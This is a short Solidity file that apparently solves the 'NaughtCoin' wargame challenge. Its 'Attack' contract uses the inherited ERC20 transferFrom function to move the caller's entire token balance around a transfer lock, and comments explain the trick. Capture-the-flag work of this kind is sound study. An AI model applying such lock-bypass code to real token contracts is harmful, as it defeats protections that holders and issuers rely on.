// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin{
  function transferFrom(address,address,uint256)external returns(bool);
  function balanceOf(address)external view returns(uint256);
}

contract Attack{
    /*
    *because a NaugtCoin is an ERC20 contract we can use 
    *inherited functions from ERC20
    *one of them is function transferFrom()
    *which is alternative way of transfernig the money
    *we transfer money directly from msg.sender(which is our account) to the address of this contract
    */
    function attack(INaughtCoin coin)external{
      coin.transferFrom(msg.sender, address(this), coin.balanceOf(msg.sender));
  
    }
}